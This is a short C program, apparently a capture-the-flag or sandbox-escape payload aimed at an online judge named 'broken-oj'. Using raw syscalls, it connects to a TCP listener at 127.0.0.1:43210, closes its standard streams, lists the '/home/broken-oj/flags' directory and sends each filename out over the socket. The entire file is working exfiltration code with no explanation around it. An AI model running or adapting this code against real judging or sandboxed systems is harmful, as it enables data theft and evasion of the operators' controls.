#include <endian.h>
#include <asm-generic/poll.h>
#include <netinet/in.h>
#include <limits.h>

#define IP(t,z,y,x)  ((x)|(y)<<8|(z)<<16|(t)<<24)

#define DEST_IP IP(127, 0, 0, 1)
#define DEST_PORT 43210

int sock;

LSS_INLINE _syscall3(int, readdir, int, fd,            struct old_linux_dirent *, dirp,
                     unsigned int,            count);

#define DIRECTORY "/home/broken-oj/flags"

static int _strlen(const char *str) {
    int l;
    for (l = 0; str[l]; l++);
    return l;
}

static void print(const char *str) {
    sys_write(sock, str, _strlen(str));
}

static void println(const char *str) {
    print(str);
    print("\n");
}

struct old_linux_dirent {
   long  d_ino;              /* inode number */
   off_t d_off;              /* offset to this old_linux_dirent */
   unsigned short d_reclen;  /* length of this d_name */
   char  d_name[NAME_MAX+1]; /* filename (null-terminated) */
};

int main(void)
{
    int fd;

    struct sockaddr_in sa;

    sys_close(0);
    sock = sys_socket(PF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        sys__exit(2);
    }
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htobe32(DEST_IP);
    sa.sin_port = htobe16(DEST_PORT);
    if (sys_connect(sock, (struct kernel_sockaddr *)&sa, sizeof(sa)) < 0) {
        sys__exit(1);
    }

    //send directory listing
    struct old_linux_dirent d;
    sys_close(1);
    fd = sys_open(DIRECTORY, O_RDONLY, 0);
    if (fd < 0) {
        println("error");
        sys__exit(3);
    }

    while (sys_readdir(fd, &d, 1)) {
        println(d.d_name);
    }

    sys__exit(0);
}

